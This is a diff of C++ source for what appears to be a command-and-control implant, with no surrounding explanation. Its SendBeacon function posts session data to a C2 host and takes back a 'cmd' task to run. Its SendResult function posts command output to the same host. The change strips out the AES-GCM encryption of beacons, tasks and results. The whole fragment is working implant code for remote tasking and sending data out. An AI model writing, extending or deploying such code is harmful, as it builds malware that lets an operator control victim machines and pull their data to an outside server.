@@ -311,33 +311,18 @@ static std::string BuildBeaconJson(const Session& s) {
 // =====================================================================
 BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     taskOut = L"sleep";
-    std::string plainBody = BuildBeaconJson(session);
+    std::string body = BuildBeaconJson(session);
 
-    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
-    if (enc.empty()) enc = plainBody;
-
-    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
-    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";
-
-    DebugLog(L"Sending encrypted beacon to " + GetC2Host());
+    DebugLog(L"Sending beacon to " + GetC2Host());
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/beacon", encBody, L"");
+                                       L"POST", L"/beacon", body, L"");
 
     if (resp.status != 200) {
         DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
         return FALSE;
     }
 
-    std::string encCmd = JsonGetString(resp.body, "enc");
-    std::string cmd;
-    if (!encCmd.empty() && !g_SessionKey.empty()) {
-        std::string decrypted = AesGcmDecrypt(g_SessionKey, encCmd);
-        if (!decrypted.empty()) {
-            cmd = JsonGetString(decrypted, "cmd");
-        }
-    }
-    if (cmd.empty()) cmd = JsonGetString(resp.body, "cmd");
-
+    std::string cmd = JsonGetString(resp.body, "cmd");
     if (!cmd.empty()) {
         taskOut = UTF8ToWString(cmd);
         DebugLog(L"Task received: " + taskOut);
@@ -351,16 +336,10 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
     std::string out = JsonEscape(WStringToUTF8(output));
-    std::string plainBody = "{\"session\":\"" + sid +
-                            "\",\"output\":\"" + out + "\"}";
-
-    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
-    if (enc.empty()) enc = plainBody;
-
-    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";
-    DebugLog(L"Sending encrypted result " + std::to_wstring(output.size()) + L" chars");
+    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
+    DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/result", encBody, L"");
+                                       L"POST", L"/result", body, L"");
     return (resp.status == 200);
 }
 
